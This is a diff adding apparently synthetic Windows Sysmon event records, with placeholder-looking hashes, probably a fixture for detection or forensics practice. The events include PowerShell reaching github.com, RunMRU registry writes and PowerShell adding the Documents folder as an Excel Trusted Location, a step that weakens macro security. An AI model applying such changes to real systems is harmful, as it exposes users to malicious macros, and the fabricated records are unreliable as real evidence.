+    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="ParentCommandLine">cmd.exe</Data>
+    <Data Name="ParentUser">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>3</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>3</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:17:15.1234567Z"/>
+    <EventRecordID>245901</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 14:17:15.123</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002600}</Data>
+    <Data Name="ProcessId">8901</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+    <Data Name="Protocol">TCP</Data>
+    <Data Name="Initiated">true</Data>
+    <Data Name="SourceIsIpv6">false</Data>
+    <Data Name="SourceIp">172.18.0.2</Data>
+    <Data Name="SourceHostname">DESKTOP-7B8K9L2</Data>
+    <Data Name="SourcePort">52443</Data>
+    <Data Name="SourcePortName">-</Data>
+    <Data Name="DestinationIsIpv6">false</Data>
+    <Data Name="DestinationIp">140.82.112.4</Data>
+    <Data Name="DestinationHostname">github.com</Data>
+    <Data Name="DestinationPort">443</Data>
+    <Data Name="DestinationPortName">https</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>13</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>13</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:18:30.5678901Z"/>
+    <EventRecordID>245902</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="UtcTime">2024-03-15 14:18:30.567</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002620}</Data>
+    <Data Name="ProcessId">9012</Data>
+    <Data Name="Image">C:\Windows\System32\reg.exe</Data>
+    <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\c</Data>
+    <Data Name="Details">notepad.exe C:\Users\bagagwauser\Documents\report.docx\1</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>13</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>13</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:18:31.6789012Z"/>
+    <EventRecordID>245903</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="UtcTime">2024-03-15 14:18:31.678</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002620}</Data>
+    <Data Name="ProcessId">9012</Data>
+    <Data Name="Image">C:\Windows\System32\reg.exe</Data>
+    <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList</Data>
+    <Data Name="Details">abc</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>13</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>13</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:20:45.7890123Z"/>
+    <EventRecordID>245904</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="UtcTime">2024-03-15 14:20:45.789</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002650}</Data>
+    <Data Name="ProcessId">9345</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="TargetObject">HKCU\Software\Microsoft\Office\16.0\Excel\Security\TrustedLocations\Location0\Path</Data>
+    <Data Name="Details">C:\Users\bagagwauser\Documents\</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:25:12.3456789Z"/>
+    <EventRecordID>245905</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 14:25:12.345</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002700}</Data>
+    <Data Name="ProcessId">9876</Data>
+    <Data Name="Image">C:\Program Files\Malwarebytes\Anti-Malware\mbam.exe</Data>
+    <Data Name="FileVersion">4.5.4.151</Data>
+    <Data Name="Description">Malwarebytes Anti-Malware</Data>
+    <Data Name="Product">Malwarebytes Anti-Malware</Data>
+    <Data Name="Company">Malwarebytes</Data>
+    <Data Name="OriginalFileName">mbam.exe</Data>
+    <Data Name="CommandLine">"C:\Program Files\Malwarebytes\Anti-Malware\mbam.exe" /background</Data>
+    <Data Name="CurrentDirectory">C:\Program Files\Malwarebytes\Anti-Malware\</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+    <Data Name="LogonGuid">{a23d8dcf-3a2b-65f2-e703-1a0000000000}</Data>
+    <Data Name="LogonId">0x3e7</Data>
+    <Data Name="TerminalSessionId">0</Data>
+    <Data Name="IntegrityLevel">System</Data>
+    <Data Name="Hashes">SHA1=F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7,MD5=C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6,SHA256=B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9,IMPHASH=D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3</Data>
+    <Data Name="ParentProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000001100}</Data>
+    <Data Name="ParentProcessId">1234</Data>
+    <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+    <Data Name="ParentCommandLine">C:\Windows\system32\services.exe</Data>
+    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
+  </EventData>
+</Event>
+</Events>
